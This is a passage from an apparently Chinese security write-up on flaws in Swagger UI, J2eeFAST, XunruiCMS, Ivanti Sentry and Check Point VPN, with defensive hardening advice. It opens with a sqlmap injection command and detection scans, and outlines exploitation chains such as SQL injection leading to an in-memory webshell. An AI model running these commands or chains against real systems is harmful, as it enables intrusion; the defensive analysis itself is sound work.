sqlmap -u "http://target/fast/sys/user/list" --data="sqlid=test" --batch

# XunruiCMS 文件上传检测
nuclei -u https://target -tags xunrui,cms

# Ivanti Sentry 检测
nuclei -u https://target -tags ivanti,sentry

# Check Point VPN 检测
nmap -n -v -Pn -sU target -p 500 --script=ike-version
```

### 6.4 利用案例

- **Swagger CSS 注入 → CSRF Token 窃取**：攻击者通过链式 CSS 盲打逐位还原 Token，伪造合法请求
- **J2eeFAST SQL 注入 → 内存马持久化**：注入读取管理员密码后登录后台，利用模板引擎注入内存马
- **Ivanti Sentry → 全网配置篡改**：获取 root 后可向所有边缘设备推送恶意路由和安全策略

---

## 0x07 共性攻击模式

### 7.1 输入校验缺失是共同根因

无论是 Swagger UI 的远程资源加载、J2eeFAST 的 `${}` 拼接、XunruiCMS 的文件上传校验，还是 Ivanti Sentry 的命令注入，根本原因都是**对用户输入缺乏充分的校验和过滤**。

### 7.2 从信息泄露到 RCE 的升级路径

CVE-2019-17495 展示了从 CSS 注入信息泄露到完整 RCE 的升级路径：
1. CSS 注入窃取 CSRF Token → 伪造请求
2. 结合其他漏洞（如文件上传）实现 RCE

### 7.3 边界安全设备的"信任链"风险

Ivanti Sentry 和 Check Point VPN 都是边界安全设备，但它们自身的漏洞反而成为了攻击者突破边界的入口。这体现了"安全设备本身也需要安全防护"的理念。

---

## 0x08 防守建议

### 8.1 紧急措施

1. **升级组件**：
   - Swagger UI → 3.23.11+
   - J2eeFAST → 最新版
   - XunruiCMS → v4.6.3+
   - Ivanti Sentry → 10.5.2+ / 10.6.2+ / 10.7.1+
   - Check Point → 安装官方热修复

2. **配置加固**：
   - 禁用 Swagger UI 的远程配置加载
   - Nginx 中禁止 `/uploadfile/` 目录执行 PHP
   - 关闭 Check Point 的 legacy Remote Access clients

### 8.2 中期加固

1. **输入校验**：对所有用户输入进行白名单校验
2. **参数化查询**：MyBatis 中强制使用 `#{}` 预编译
3. **文件上传安全**：随机重命名上传文件，剥离原始扩展名
4. **最小权限**：数据库账号不授予 FILE、SUPER 等高危权限

### 8.3 长期策略

1. **定期漏洞评估**：对企业应用进行定期的渗透测试
2. **SBOM 管理**：跟踪所有第三方组件版本
3. **零信任架构**：将边界安全设备纳入零信任网络
4. **应急响应预案**：制定针对企业应用漏洞的专项响应流程

---

## 0x09 参考资料

- [MITRE CVE-2019-17495](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17495)
- [PortSwigger: CSS Injection in Swagger UI](https://portswigger.net/daily-swig/vulnerability-in-swagger-ui-could-lead-to-information-disclosure)
- [NVD - CVE-2023-24162](https://nvd.nist.gov/vuln/detail/CVE-2023-24162)
- [NVD - CVE-2024-11392](https://nvd.nist.gov/vuln/detail/CVE-2024-11392)
- [watchTowr: Ivanti Sentry Command Injection Analysis](https://labs.watchtowr.com/more-evidence-that-words-dont-mean-what-we-thought-they-meant-ivanti-sentry-pre-auth-os-command-injection-cve-2026-10520/)
- [watchTowr: Check Point IKEv1 Auth Bypass](https://labs.watchtowr.com/marking-your-own-homework-check-point-remote-access-vpn-ikev1-authentication-bypass-cve-2026-50751/)
- [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
